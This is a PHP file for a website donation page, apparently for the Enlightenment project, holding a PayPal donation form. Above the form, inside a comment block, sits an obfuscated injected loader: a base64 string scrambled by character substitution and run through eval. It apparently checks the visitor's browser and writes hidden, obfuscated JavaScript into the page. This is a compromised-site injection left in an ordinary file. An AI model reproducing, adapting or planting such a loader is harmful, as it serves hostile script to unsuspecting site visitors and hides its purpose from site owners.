<?php 
	require_once "donate_settings.php";
	/*
	$_F=__FILE__; 
	$_X='Pz48P1BIUA0KJGIydDRkPSAkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ107
	DQo0Zig1cjVnNCgiaHR0cDovL3d3dy5jai5jMm0vbjV0dzJya3EzMWw0dHkiLCRiM
	nQ0ZCkpIHsNCiAgJGIydCA9ICJodHRwOi8vd3d3LmNqLmMybS9uNXR3MnJrcTMxbD
	R0eSI7DQp9DQo0ZiAoJGIydCAhPSAiaHR0cDovL3d3dy5jai5jMm0vbjV0dzJya3E
	zMWw0dHkiKXsNCj8+DQo8c2NyNHB0IHR5cDU9J3Q1eHQvajF2MXNjcjRwdCc+IDV2
	MWwoM241c2MxcDUoJyVlZSU3aSVlNSVlbyU3dSVlOSVlZiVlNSVhMCVldSVldSVhO
	CVlNSVhOSVhMCU3YiVlYSVhMCVvZCVhMCU3aSVlNSVlaSU3byVlbyVlNiU3MCVlaS
	VhOCVlNSVhOSVvYiU3ZSVlNiU3YSVhMCVlNiVhMCVvZCVhMCVhNyVhNyVvYiVhMCV
	lZSVlZiU3YSVhMCVhOCVlOSVvZCVvMCVvYiVlOSVvYyVlYSVhNSVlYyVlaSVlNSVl
	NyU3dSVlOCVvYiVlOSVhYiVhYiVhOSVhMCU3YiVlNiVhMCVhYiVvZCVhMCVpbyU3d
	SU3YSVlOSVlNSVlNyVhNSVlZSU3YSVlZiVlZCV1byVlOCVlNiU3YSV1byVlZiVldS
	VlaSVhOCVlYSVhNSVlbyVlOCVlNiU3YSV1byVlZiVldSVlaSV1NiU3dSVhOCVlOSV
	hOSVhZCVvNiVhOSVvYiU3ZCVhMCVldSVlZiVlbyU3aSVlZCVlaSVlNSU3dSVhNSU3
	NyU3YSVlOSU3dSVlaSVhOCU3aSVlNSVlaSU3byVlbyVlNiU3MCVlaSVhOCVlNiVhO
	SVhOSVvYiVhMCU3ZCcpKTs8L3NjcjRwdD48c2NyNHB0IHR5cDU9J3Q1eHQvajF2MX
	NjcjRwdCc+IGRkKCI9SkdTQk5GIVRTRD4jNDMzcTswMHh4eC9rNXBycGR6L2RwbjB
	kbWpkbC5vNml1ZTg2LmE2aTZlYTphIyFYSkVVST4jYSMhSUZKSElVPiNhIz89MEpH
	U0JORj89Y3M/PUpHU0JORiFUU0Q+IzQzM3E7MDB4eHgvYjJzNXBme3N0LzJmMzBkb
	WpkbC5vNml1ZTg2LmE2aWE5OTY6IyFYSkVVST4jYSMhSUZKSElVPiNhIz89MEpHU0
	JORj8iKTsgPC9zY3I0cHQ+DQo8P1BIUA0KfQ0KPz4=';
	
	eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJ
	F9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSg
	nX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wO
	w=='));
	*/
?>

<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
	<input type="hidden" name="cmd" value="_xclick">
	<input type="hidden" name="business" value="ningerso@gmail.com">
	<input type="hidden" name="item_name" value="donation">
	<input type="hidden" name="item_number" value="0107">
	<input type="hidden" name="no_shipping" value="1">
	<input type="hidden" name="cn" value="Comments">
	<input type="hidden" name="currency_code" value="USD">
	
	<input type="hidden" name="notify_url" value="http://enlightenment.org/donate/donate_ipn.php">
	<input type="hidden" name="return" value="http://enlightenment.org/donate/thankyou.php">
	<input type="hidden" name="cancel_return" value="http://enlightenment.org/donate/cancelled.php">
	
	<input type="hidden" name="tax" value="0">
	<input type="hidden" name="pal" value="5NK4VSJNG9D22">
	<input type="hidden" name="mbr" value="5NK4VSJNG9D22">
	<input type="hidden" name="bn" value="PP-DonationsBF">

	<b>$</b><input name="amount" type="text" value="" size="6" maxlength="5" /><br />
	<input type="submit" name="submit" value="Submit" />
	
	<img alt="" border="0" src="http://www.paypal.com/en_US/i/scr/pixel.gif" width="1" height="1">
</form>
